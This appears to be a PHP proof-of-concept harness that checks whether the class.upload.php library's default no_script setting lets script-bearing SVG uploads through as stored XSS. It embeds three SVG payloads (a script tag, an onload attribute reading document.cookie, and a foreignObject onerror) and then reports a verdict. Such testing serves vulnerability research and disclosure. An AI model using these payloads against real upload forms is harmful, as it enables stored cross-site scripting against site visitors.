<?php
/**
 * poc_matrix.php — RUNTIME EVIDENCE HARNESS
 * verot/class.upload.php — SVG stored-XSS bypass of no_script (default config)
 *
 * Tests, with ALL DEFAULTS (no_script=true, mime_check=true, allowed=image/*+...):
 *   1. evil.svg with <script> tag
 *   2. evil.svg with onload= attribute
 *   3. evil.svg with <foreignObject> + onerror=
 *   4. CONTROL: same-class script content uploaded as .html (expect rename/reject)
 *
 * Verdict logic: VULNERABLE iff SVG saved with .svg extension AND bytes
 * byte-identical to input AND [PWN] marker survives in destination file,
 * WHILE .html control gets neutralised (renamed to .txt) or rejected.
 *
 * usage: php poc_matrix.php <lib_dir> <out_dir>
 */

error_reporting(E_ERROR | E_PARSE); // keep evidence output clean; deprecations irrelevant

$libDir = rtrim($argv[1] ?? '', '/');
$outDir = rtrim($argv[2] ?? (sys_get_temp_dir() . '/poc_out'), '/');
if ($libDir === '' || !is_dir($libDir)) { fwrite(STDERR, "usage: php poc_matrix.php <lib_dir> <out_dir>\n"); exit(1); }

$classFile = null;
foreach ([$libDir . '/src/class.upload.php', $libDir . '/class.upload.php'] as $c) {
    if (file_exists($c)) { $classFile = $c; break; }
}
if ($classFile === null) { fwrite(STDERR, "class.upload.php not found under {$libDir}\n"); exit(1); }
require $classFile;

$cls = class_exists('Verot\Upload\Upload') ? 'Verot\Upload\Upload' : 'Upload';

$PWN = '[PWN-' . bin2hex(random_bytes(3)) . ']';

$payloads = [
    'svg_script_tag'  => "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        . "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"120\">\n"
        . "  <script type=\"text/javascript\">alert(document.domain){$PWN}</script>\n"
        . "  <circle cx=\"60\" cy=\"60\" r=\"50\" fill=\"red\"/>\n</svg>",
    'svg_onload_attr' => "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        . "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"120\">\n"
        . "  <rect width=\"120\" height=\"120\" fill=\"blue\" onload=\"alert(document.cookie){$PWN}\"/>\n</svg>",
    'svg_foreignobj'  => "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        . "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"120\">\n"
        . "  <foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\">\n"
        . "    <img src=\"x\" onerror=\"alert(1){$PWN}\"/>\n"
        . "  </body></foreignObject>\n</svg>",
];
$control = "<html><body><script>alert(document.domain)<!--CTRL--></script></body></html>";

function make_upload($cls, $tmpFile) {
    if (in_array('__construct', get_class_methods($cls), true)) {
        return new $cls($tmpFile, 'en_GB');
    }
    $h = new $cls();
    $h->upload($tmpFile, 'en_GB');
    return $h;
}

function run_case($cls, $name, $ext, $content) {
    $out = [];
    try {
        // temp file MUST carry the real extension — otherwise file_force_extension
        // (default true) would rename extension-less files and skew the test
        $tmp = sys_get_temp_dir() . '/evil_' . bin2hex(random_bytes(4)) . '.' . $ext;
        file_put_contents($tmp, $content);

        $dstDir = sys_get_temp_dir() . '/pocdst_' . bin2hex(random_bytes(4));
        @mkdir($dstDir, 0777, true);

        $h = make_upload($cls, $tmp);
        $h->process($dstDir);

        $out['name']      = $name;
        $out['mime']      = (string)($h->file_src_mime ?? '');
        $out['processed'] = (bool)($h->processed ?? false);
        $out['dst_name']  = (string)($h->file_dst_name ?? '');
        $out['identical'] = false;
        $out['pwn']       = false;
        if ($out['processed'] && $out['dst_name'] !== '') {
            $saved = @file_get_contents($dstDir . '/' . $out['dst_name']);
            if ($saved !== false) {
                $out['identical'] = hash('sha256', $content) === hash('sha256', $saved);
                $out['pwn']       = strpos($saved, '[PWN-') !== false;
            }
        } else {
            $out['error'] = (string)($h->error ?? '');
        }
        $log = strip_tags((string)($h->log ?? ''));
        $hits = '';
        foreach (preg_split('/\r?\n/', $log) as $line) {
            if (preg_match('/(renam|text file|script|MIME type|allowed|forbidden)/i', $line)) {
                $hits .= trim($line) . ' | ';
            }
        }
        $out['log'] = substr($hits, 0, 500);
    } catch (Throwable $e) {
        $out['name'] = $name;
        $out['fatal'] = $e->getMessage();
    }
    return $out;
}

echo "=== class.upload.php SVG no_script bypass — runtime PoC ===\n";
echo "php          : " . PHP_VERSION . "\n";
echo "class file   : {$classFile}\n";
echo "fileinfo ext : " . var_export(extension_loaded('fileinfo'), true) . "\n";

$h0 = make_upload($cls, __FILE__);
echo "lib version  : " . (string)($h0->version ?? 'unknown') . "\n\n";

$results = [];
foreach ($payloads as $name => $content) {
    $results[$name] = run_case($cls, $name, 'svg', $content);
}
$ctrl = run_case($cls, 'control_html', 'html', $control);

foreach ($results as $r) {
    printf("[%s]\n", $r['name']);
    if (isset($r['fatal'])) { printf("  FATAL     : %s\n\n", $r['fatal']); continue; }
    printf("  processed : %s\n", var_export($r['processed'], true));
    printf("  mime      : %s\n", $r['mime']);
    printf("  dst name  : %s\n", $r['dst_name'] !== '' ? $r['dst_name'] : '(none)');
    printf("  identical : %s\n", var_export($r['identical'], true));
    printf("  pwn       : %s\n", var_export($r['pwn'], true));
    if (!empty($r['error'])) printf("  error     : %s\n", $r['error']);
    if ($r['log'] !== '')    printf("  log       : %s\n", $r['log']);
    echo "\n";
}

printf("[control_html]\n");
if (isset($ctrl['fatal'])) {
    printf("  FATAL     : %s\n", $ctrl['fatal']);
} else {
    printf("  processed : %s\n", var_export($ctrl['processed'], true));
    printf("  mime      : %s\n", $ctrl['mime']);
    printf("  dst name  : %s   <-- no_script behaviour for .html\n", $ctrl['dst_name'] !== '' ? $ctrl['dst_name'] : '(none)');
    if ($ctrl['log'] !== '') printf("  log       : %s\n", $ctrl['log']);
}

echo "\n=== verdict ===\n";
$svgVuln = false;
$detail  = [];
foreach ($results as $r) {
    if (isset($r['fatal'])) continue;
    $isSvgSaved = $r['processed']
        && substr(strtolower($r['dst_name']), -4) === '.svg'
        && $r['identical'] && $r['pwn'];
    if ($isSvgSaved) { $svgVuln = true; $detail[] = $r['dst_name']; }
}
$ctrlNeutralised = isset($ctrl['fatal'])
    || !$ctrl['processed']
    || ($ctrl['dst_name'] !== '' && substr(strtolower($ctrl['dst_name']), -4) !== '.html');

echo $svgVuln
    ? "[!] RESULT: VULNERABLE — script-bearing SVG stored byte-identical as: " . implode(', ', $detail) . "\n"
    : "[i] RESULT: NOT VULNERABLE on this version\n";
echo "[i] control .html neutralised: " . var_export($ctrlNeutralised, true) . "\n";
echo "[i] asymmetry (html blocked, svg executable content stored): "
    . var_export($svgVuln && $ctrlNeutralised, true) . "\n";
